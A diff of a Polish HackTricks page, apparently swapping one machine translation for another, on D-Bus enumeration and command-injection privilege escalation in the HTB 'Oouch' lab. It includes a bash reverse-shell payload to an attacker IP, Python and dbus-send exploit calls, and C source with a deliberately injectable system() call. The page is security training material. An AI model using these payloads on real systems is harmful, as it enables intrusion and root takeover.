@@ -1,27 +1,27 @@
-# Wyliczanie D-Bus i Wstrzykiwanie Poleceń do Eskalacji Uprawnień
+# D-Bus Enumeration & Command Injection Privilege Escalation
 
 {% hint style="success" %}
-Dowiedz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Dowiedz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Wesprzyj HackTricks</summary>
+<summary>Support HackTricks</summary>
 
-* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
-* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Dziel się trikami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na githubie.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
 
-## **Wyliczanie GUI**
+## **GUI enumeration**
 
-D-Bus jest wykorzystywany jako mediator komunikacji międzyprocesowej (IPC) w środowiskach pulpitu Ubuntu. Na Ubuntu obserwuje się równoczesne działanie kilku magistrali komunikacyjnych: magistrala systemowa, głównie wykorzystywana przez **usługi uprzywilejowane do udostępniania usług istotnych dla całego systemu**, oraz magistrala sesji dla każdego zalogowanego użytkownika, udostępniająca usługi istotne tylko dla danego użytkownika. Tutaj skupiamy się głównie na magistrali systemowej ze względu na jej powiązanie z usługami działającymi z wyższymi uprawnieniami (np. root), ponieważ naszym celem jest podniesienie uprawnień. Zauważono, że architektura D-Bus wykorzystuje 'router' na każdą magistralę sesji, który jest odpowiedzialny za przekierowywanie wiadomości klientów do odpowiednich usług na podstawie adresu określonego przez klientów dla usługi, z którą chcą się komunikować.
+D-Bus jest wykorzystywany jako mediator komunikacji międzyprocesowej (IPC) w środowiskach desktopowych Ubuntu. W Ubuntu obserwuje się równoczesne działanie kilku magistrali komunikacyjnych: magistrala systemowa, głównie wykorzystywana przez **usługi z uprawnieniami do udostępniania usług istotnych w całym systemie**, oraz magistrala sesji dla każdego zalogowanego użytkownika, udostępniająca usługi istotne tylko dla tego konkretnego użytkownika. Skupiamy się tutaj głównie na magistrali systemowej ze względu na jej związek z usługami działającymi z wyższymi uprawnieniami (np. root), ponieważ naszym celem jest podniesienie uprawnień. Zauważono, że architektura D-Bus wykorzystuje 'routera' dla każdej magistrali sesji, który odpowiada za przekierowywanie wiadomości klientów do odpowiednich usług na podstawie adresu określonego przez klientów dla usługi, z którą chcą się komunikować.
 
-Usługi na D-Bus są definiowane przez **obiekty** i **interfejsy**, które udostępniają. Obiekty można porównać do instancji klas w standardowych językach programowania zorientowanych obiektowo, przy czym każda instancja jest unikalnie identyfikowana przez **ścieżkę obiektu**. Ta ścieżka, podobnie jak ścieżka systemu plików, jednoznacznie identyfikuje każdy obiekt udostępniany przez usługę. Kluczowym interfejsem do celów badawczych jest interfejs **org.freedesktop.DBus.Introspectable**, zawierający pojedynczą metodę, Introspect. Ta metoda zwraca reprezentację XML obsługiwanych metod obiektu, sygnałów i właściwości, z naciskiem tutaj na metody, pomijając właściwości i sygnały.
+Usługi na D-Bus są definiowane przez **obiekty** i **interfejsy**, które udostępniają. Obiekty można porównać do instancji klas w standardowych językach OOP, przy czym każda instancja jest unikalnie identyfikowana przez **ścieżkę obiektu**. Ta ścieżka, podobnie jak ścieżka w systemie plików, unikalnie identyfikuje każdy obiekt udostępniony przez usługę. Kluczowym interfejsem do celów badawczych jest interfejs **org.freedesktop.DBus.Introspectable**, który zawiera jedną metodę, Introspect. Metoda ta zwraca reprezentację XML metod, sygnałów i właściwości obsługiwanych przez obiekt, koncentrując się tutaj na metodach, pomijając właściwości i sygnały.
 
-Do komunikacji z interfejsem D-Bus użyto dwóch narzędzi: narzędzia wiersza poleceń o nazwie **gdbus** do łatwego wywoływania metod udostępnianych przez D-Bus w skryptach oraz [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), narzędzia GUI opartego na Pythonie, przeznaczonego do wyliczania dostępnych usług na każdej magistrali i wyświetlania obiektów zawartych w każdej usłudze.
+Do komunikacji z interfejsem D-Bus wykorzystano dwa narzędzia: narzędzie CLI o nazwie **gdbus** do łatwego wywoływania metod udostępnianych przez D-Bus w skryptach oraz [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), narzędzie GUI oparte na Pythonie, zaprojektowane do enumeracji usług dostępnych na każdej magistrali i wyświetlania obiektów zawartych w każdej usłudze.
 ```bash
 sudo apt-get install d-feet
 ```
@@ -30,21 +30,21 @@ sudo apt-get install d-feet
 ![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)
 
 
-W pierwszym obrazie pokazane są usługi zarejestrowane w systemowym magistrali D-Bus, z wyróżnieniem **org.debin.apt** po wybraniu przycisku Magistrali Systemowej. D-Feet zapytuje tę usługę o obiekty, wyświetlając interfejsy, metody, właściwości i sygnały dla wybranych obiektów, widoczne na drugim obrazie. Szczegóły podane są również dla sygnatur każdej metody.
+Na pierwszym obrazie pokazane są usługi zarejestrowane w systemowej szynie D-Bus, z **org.debin.apt** szczególnie wyróżnionym po wybraniu przycisku System Bus. D-Feet zapytuje tę usługę o obiekty, wyświetlając interfejsy, metody, właściwości i sygnały dla wybranych obiektów, co widać na drugim obrazie. Podpis każdej metody jest również szczegółowo opisany.
 
-Niezwykłą cechą jest wyświetlanie **ID procesu (pid)** i **linii poleceń** usługi, co jest przydatne do potwierdzenia, czy usługa działa z podniesionymi uprawnieniami, co jest istotne dla celów badawczych.
+Ciekawą cechą jest wyświetlanie **identyfikatora procesu (pid)** i **linii poleceń** usługi, co jest przydatne do potwierdzenia, czy usługa działa z podwyższonymi uprawnieniami, co jest ważne dla istotności badań.
 
-**D-Feet pozwala również na wywołanie metody**: użytkownicy mogą wprowadzać wyrażenia Pythona jako parametry, które D-Feet konwertuje na typy D-Bus przed przekazaniem do usługi.
+**D-Feet umożliwia również wywoływanie metod**: użytkownicy mogą wprowadzać wyrażenia Pythona jako parametry, które D-Feet konwertuje na typy D-Bus przed przekazaniem do usługi.
 
-Należy jednak zauważyć, że **niektóre metody wymagają uwierzytelnienia** przed umożliwieniem nam ich wywołania. Zignorujemy te metody, ponieważ naszym celem jest podniesienie uprawnień bez konieczności posiadania poświadczeń.
+Należy jednak zauważyć, że **niektóre metody wymagają uwierzytelnienia** przed pozwoleniem na ich wywołanie. Zignorujemy te metody, ponieważ naszym celem jest podniesienie naszych uprawnień bez poświadczeń w pierwszej kolejności.
 
-Należy również zauważyć, że niektóre usługi zapytują inną usługę D-Bus o nazwie org.freedeskto.PolicyKit1, czy użytkownik powinien mieć zezwolenie na wykonanie określonych działań, czy nie.
+Należy również zauważyć, że niektóre z usług zapytują inną usługę D-Bus o nazwie org.freedeskto.PolicyKit1, czy użytkownik powinien mieć prawo do wykonywania określonych działań, czy nie.
 
-## **Wyliczenie linii poleceń**
+## **Cmd line Enumeration**
 
-### Wyświetlanie Obiektów Usługi
+### Lista obiektów usługi
 
-Możliwe jest wyświetlenie otwartych interfejsów D-Bus za pomocą:
+Możliwe jest wylistowanie otwartych interfejsów D-Bus za pomocą:
 ```bash
 busctl list #List D-Bus interfaces
 
@@ -68,13 +68,13 @@ org.freedesktop.PolicyKit1               - -               -                (act
 org.freedesktop.hostname1                - -               -                (activatable) -                         -
 org.freedesktop.locale1                  - -               -                (activatable) -                         -
 ```
-#### Połączenia
+#### Connections
 
-[Z Wikipedii:](https://en.wikipedia.org/wiki/D-Bus) Gdy proces ustanawia połączenie z magistralą, magistrala przypisuje temu połączeniu specjalną nazwę magistrali o nazwie _unikatowa nazwa połączenia_. Nazwy magistrali tego typu są niemutowalne - gwarantowane jest, że nie zmienią się tak długo, jak istnieje połączenie - i co ważniejsze, nie mogą być ponownie użyte podczas trwania magistrali. Oznacza to, że żadne inne połączenie z tą magistralą nigdy nie będzie miało przypisanej takiej unikatowej nazwy połączenia, nawet jeśli ten sam proces zamknie połączenie z magistralą i utworzy nowe. Unikatowe nazwy połączeń są łatwo rozpoznawalne, ponieważ zaczynają się od - w przeciwnym razie zabronionego - znaku dwukropka.
+[Z Wikipedii:](https://en.wikipedia.org/wiki/D-Bus) Kiedy proces nawiązuje połączenie z magistralą, magistrala przypisuje temu połączeniu specjalną nazwę magistrali zwaną _unikalną nazwą połączenia_. Nazwy magistrali tego typu są niezmienne—gwarantuje się, że nie zmienią się, dopóki połączenie istnieje—i, co ważniejsze, nie mogą być ponownie używane w czasie życia magistrali. Oznacza to, że żadne inne połączenie z tą magistralą nigdy nie otrzyma przypisanej takiej unikalnej nazwy połączenia, nawet jeśli ten sam proces zamknie połączenie z magistralą i utworzy nowe. Unikalne nazwy połączeń są łatwe do rozpoznania, ponieważ zaczynają się od—w przeciwnym razie zabronionego—znaku dwukropka.
 
-### Informacje o Obiekcie Usługi
+### Service Object Info
 
-Następnie można uzyskać pewne informacje o interfejsie za pomocą:
+Następnie możesz uzyskać pewne informacje o interfejsie za pomocą:
 ```bash
 busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface
 
@@ -134,7 +134,7 @@ cap_mknod cap_lease cap_audit_write cap_audit_control
 cap_setfcap cap_mac_override cap_mac_admin cap_syslog
 cap_wake_alarm cap_block_suspend cap_audit_read
 ```
-### Wyświetlanie interfejsów obiektu usługi
+### Lista interfejsów obiektu usługi
 
 Musisz mieć wystarczające uprawnienia.
 ```bash
@@ -144,9 +144,9 @@ busctl tree htb.oouch.Block #Get Interfaces of the service object
 └─/htb/oouch
 └─/htb/oouch/Block
 ```
-### Zbadaj interfejs obiektu usługi
+### Introspect Interface of a Service Object
 
-Zauważ, jak w tym przykładzie został wybrany najnowszy interfejs odkryty przy użyciu parametru `tree` (_patrz poprzedni rozdział_):
+Zauważ, że w tym przykładzie wybrano najnowszy interfejs odkryty za pomocą parametru `tree` (_zobacz poprzednią sekcję_):
 ```bash
 busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface
 
@@ -164,16 +164,16 @@ org.freedesktop.DBus.Properties     interface -         -            -
 .Set                                method    ssv       -            -
 .PropertiesChanged                  signal    sa{sv}as  -            -
 ```
-Zauważ metodę `.Block` interfejsu `htb.oouch.Block` (tę, którą nas interesuje). "s" w innych kolumnach może oznaczać, że oczekiwany jest ciąg znaków.
+Zauważ metodę `.Block` interfejsu `htb.oouch.Block` (to jest to, czym się interesujemy). "s" w innych kolumnach może oznaczać, że oczekuje ciągu znaków.
 
-### Interfejs Monitorowania/Przechwytywania
+### Interfejs monitorowania/łapania
 
-Posiadając wystarczające uprawnienia (same uprawnienia `send_destination` i `receive_sender` nie wystarczą), możesz **monitorować komunikację D-Bus**.
+Z wystarczającymi uprawnieniami (tylko uprawnienia `send_destination` i `receive_sender` nie wystarczą) możesz **monitorować komunikację D-Bus**.
 
-Aby **monitorować** **komunikację**, będziesz musiał być **rootem**. Jeśli nadal napotykasz problemy z uzyskaniem uprawnień roota, sprawdź [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) oraz [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)
+Aby **monitorować** **komunikację**, musisz być **rootem.** Jeśli nadal masz problemy z byciem rootem, sprawdź [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) oraz [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)
 
 {% hint style="warning" %}
-Jeśli wiesz, jak skonfigurować plik konfiguracyjny D-Bus, aby **pozwolić użytkownikom nie będącym rootem na podsłuchiwanie** komunikacji, proszę **skontaktuj się ze mną**!
+Jeśli wiesz, jak skonfigurować plik konfiguracyjny D-Bus, aby **zezwolić użytkownikom niebędącym rootem na podsłuchiwanie** komunikacji, proszę **skontaktuj się ze mną**!
 {% endhint %}
 
 Różne sposoby monitorowania:
@@ -182,7 +182,7 @@ sudo busctl monitor htb.oouch.Block #Monitor only specified
 sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
 sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
 ```
-W poniższym przykładzie monitorowany jest interfejs `htb.oouch.Block` i **przesyłana jest wiadomość "**_**lalalalal**_**" poprzez błąd w komunikacji**:
+W następującym przykładzie interfejs `htb.oouch.Block` jest monitorowany, a **wiadomość "**_**lalalalal**_**" jest wysyłana przez nieporozumienie**:
 ```bash
 busctl monitor htb.oouch.Block
 
@@ -203,13 +203,13 @@ STRING "Carried out :D";
 ```
 Możesz użyć `capture` zamiast `monitor`, aby zapisać wyniki w pliku pcap.
 
-#### Filtracja wszystkich zbędnych informacji <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>
+#### Filtrowanie wszystkich zakłóceń <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>
 
-Jeśli jest zbyt wiele informacji na magistrali, przekaż regułę dopasowania w ten sposób:
+Jeśli na busie jest zbyt wiele informacji, przekaż regułę dopasowania w ten sposób:
 ```bash
 dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
 ```
-Wiele reguł można określić. Jeśli wiadomość pasuje do _któregokolwiek_ z reguł, wiadomość zostanie wydrukowana. Na przykład:
+Wiele reguł można określić. Jeśli wiadomość pasuje do _jakiejkolwiek_ z reguł, wiadomość zostanie wydrukowana. Tak:
 ```bash
 dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
 ```
@@ -221,9 +221,9 @@ Zobacz [dokumentację D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.
 
 ### Więcej
 
-`busctl` ma jeszcze więcej opcji, [**znajdziesz je wszystkie tutaj**](https://www.freedesktop.org/software/systemd/man/busctl.html).
+`busctl` ma jeszcze więcej opcji, [**znajdź wszystkie tutaj**](https://www.freedesktop.org/software/systemd/man/busctl.html).
 
-## **Sytuacja podatności**
+## **Scenariusz podatny na atak**
 
 Jako użytkownik **qtc wewnątrz hosta "oouch" z HTB** możesz znaleźć **nieoczekiwany plik konfiguracyjny D-Bus** znajdujący się w _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
 ```xml
@@ -246,9 +246,9 @@ Jako użytkownik **qtc wewnątrz hosta "oouch" z HTB** możesz znaleźć **nieoc
 
 </busconfig>
 ```
-Zauważ z poprzedniej konfiguracji, że **musisz być użytkownikiem `root` lub `www-data`, aby wysyłać i odbierać informacje** za pośrednictwem tej komunikacji D-BUS.
+Zauważ z poprzedniej konfiguracji, że **musisz być użytkownikiem `root` lub `www-data`, aby wysyłać i odbierać informacje** za pomocą tej komunikacji D-BUS.
 
-Jako użytkownik **qtc** wewnątrz kontenera dockerowego **aeb4525789d8** możesz znaleźć kod związany z dbus w pliku _/code/oouch/routes.py._ Oto interesujący kod:
+Jako użytkownik **qtc** wewnątrz kontenera docker **aeb4525789d8** możesz znaleźć kod związany z dbus w pliku _/code/oouch/routes.py._ To jest interesujący kod:
 ```python
 if primitive_xss.search(form.textfield.data):
 bus = dbus.SystemBus()
@@ -260,14 +260,14 @@ response = block_iface.Block(client_ip)
 bus.close()
 return render_template('hacker.html', title='Hacker')
 ```
-Jak widać, następuje **połączenie z interfejsem D-Bus** i wysłanie do funkcji **"Block"** parametru "client\_ip".
+As you can see, it is **connecting to a D-Bus interface** and sending to the **"Block" function** the "client\_ip".
 
-Po drugiej stronie połączenia D-Bus działa skompilowany binarny plik w języku C. Ten kod **nasłuchuje** połączenia D-Bus **w poszukiwaniu adresu IP i wywołuje iptables za pomocą funkcji `system`** w celu zablokowania podanego adresu IP.\
-**Wywołanie `system` jest celowo podatne na wstrzyknięcie poleceń**, więc ładunek takiej postaci jak poniższy spowoduje utworzenie powłoki zwrotnej: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`
+W drugiej stronie połączenia D-Bus działa skompilowany binarny plik C. Ten kod **nasłuchuje** w połączeniu D-Bus **na adres IP i wywołuje iptables za pomocą funkcji `system`**, aby zablokować dany adres IP.\
+**Wywołanie `system` jest celowo podatne na wstrzyknięcie poleceń**, więc ładunek taki jak poniższy stworzy powrotną powłokę: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`
 
-### Wykorzystaj to
+### Exploit it
 
-Na końcu tej strony znajdziesz **pełny kod C aplikacji D-Bus**. Wewnątrz, pomiędzy liniami 91-97, znajdziesz, jak są **zarejestrowane `ścieżka obiektu D-Bus`** i **`nazwa interfejsu`**. Te informacje będą niezbędne do wysłania danych do połączenia D-Bus:
+Na końcu tej strony znajdziesz **kompletny kod C aplikacji D-Bus**. Wewnątrz znajdziesz między liniami 91-97 **jak `D-Bus object path`** **i `interface name`** są **rejestrowane**. Ta informacja będzie niezbędna do wysyłania informacji do połączenia D-Bus:
 ```c
 /* Install the object */
 r = sd_bus_add_object_vtable(bus,
@@ -277,13 +277,13 @@ r = sd_bus_add_object_vtable(bus,
 block_vtable,
 NULL);
 ```
-Również, w linii 57 można znaleźć, że **jedyną zarejestrowaną metodą** komunikacji D-Bus jest `Block` (_**Dlatego w następnym rozdziale ładunki zostaną wysłane do obiektu usługi `htb.oouch.Block`, interfejsu `/htb/oouch/Block` oraz nazwy metody `Block`**_):
+Również, w linii 57 możesz znaleźć, że **jedyną zarejestrowaną metodą** dla tej komunikacji D-Bus jest `Block`(_**Dlatego w następnej sekcji ładunki będą wysyłane do obiektu usługi `htb.oouch.Block`, interfejsu `/htb/oouch/Block` i nazwy metody `Block`**_):
 ```c
 SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
 ```
 #### Python
 
-Następujący kod Pythona wyśle ładunek do połączenia D-Bus do metody `Block` za pomocą `block_iface.Block(runme)` (_zauważ, że został wydobyty z poprzedniego fragmentu kodu_):
+Poniższy kod w Pythonie wyśle ładunek do połączenia D-Bus do metody `Block` za pomocą `block_iface.Block(runme)` (_zauważ, że został wyodrębniony z poprzedniego fragmentu kodu_):
 ```python
 import dbus
 bus = dbus.SystemBus()
@@ -297,16 +297,16 @@ bus.close()
 ```bash
 dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
 ```
-* `dbus-send` jest narzędziem używanym do wysyłania wiadomości do "Message Bus".
-* Message Bus – Oprogramowanie używane przez systemy do ułatwienia komunikacji między aplikacjami. Jest związane z Kolejką Wiadomości (wiadomości są uporządkowane sekwencyjnie), ale w Message Bus wiadomości są wysyłane w modelu subskrypcji i są bardzo szybkie.
-* Tag "-system" służy do oznaczenia, że jest to wiadomość systemowa, a nie sesyjna (domyślnie).
-* Tag "--print-reply" służy do odpowiedniego wyświetlenia naszej wiadomości i odbierania odpowiedzi w czytelnej formie dla człowieka.
-* "--dest=Dbus-Interface-Block" – Adres interfejsu Dbus.
-* "--string:" – Typ wiadomości, którą chcemy wysłać do interfejsu. Istnieje kilka formatów wysyłania wiadomości, takich jak double, bytes, booleans, int, objpath. Spośród nich "object path" jest przydatny, gdy chcemy wysłać ścieżkę pliku do interfejsu Dbus. W tym przypadku możemy użyć specjalnego pliku (FIFO), aby przekazać polecenie do interfejsu pod nazwą pliku. "string:;" – Służy to do ponownego wywołania ścieżki obiektu, gdzie umieszczamy plik FIFO z odwróconym powłokowaniem.
-  
-_Zauważ, że w `htb.oouch.Block.Block`, pierwsza część (`htb.oouch.Block`) odnosi się do obiektu usługi, a ostatnia część (`.Block`) odnosi się do nazwy metody._
+* `dbus-send` to narzędzie używane do wysyłania wiadomości do „Message Bus”
+* Message Bus – Oprogramowanie używane przez systemy do ułatwienia komunikacji między aplikacjami. Jest związane z Message Queue (wiadomości są uporządkowane w sekwencji), ale w Message Bus wiadomości są wysyłane w modelu subskrypcyjnym i są również bardzo szybkie.
+* Tag „-system” jest używany do oznaczenia, że jest to wiadomość systemowa, a nie wiadomość sesyjna (domyślnie).
+* Tag „–print-reply” jest używany do odpowiedniego wydrukowania naszej wiadomości i odbierania wszelkich odpowiedzi w formacie czytelnym dla człowieka.
+* „–dest=Dbus-Interface-Block” Adres interfejsu Dbus.
+* „–string:” – Typ wiadomości, którą chcemy wysłać do interfejsu. Istnieje kilka formatów wysyłania wiadomości, takich jak double, bytes, booleans, int, objpath. Z tego, „object path” jest przydatny, gdy chcemy wysłać ścieżkę pliku do interfejsu Dbus. W tym przypadku możemy użyć specjalnego pliku (FIFO), aby przekazać polecenie do interfejsu w imieniu pliku. „string:;” – To jest, aby ponownie wywołać ścieżkę obiektu, gdzie umieszczamy plik/polecenie odwróconego powłoki FIFO.
 
-### Kod w języku C
+_Uwaga, że w `htb.oouch.Block.Block`, pierwsza część (`htb.oouch.Block`) odnosi się do obiektu usługi, a ostatnia część (`.Block`) odnosi się do nazwy metody._
+
+### C code
 
 {% code title="d-bus_server.c" %}
 ```c
@@ -451,20 +451,20 @@ return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
 ```
 {% endcode %}
 
-## Odnośniki
+## Odniesienia
 * [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
 
 {% hint style="success" %}
-Naucz się i praktykuj Hacking w AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Naucz się i praktykuj Hacking w GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Wesprzyj HackTricks</summary>
+<summary>Wsparcie dla HackTricks</summary>
 
 * Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
 * **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Udostępnij sztuczki hakerskie, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.
 
 </details>
 {% endhint %}
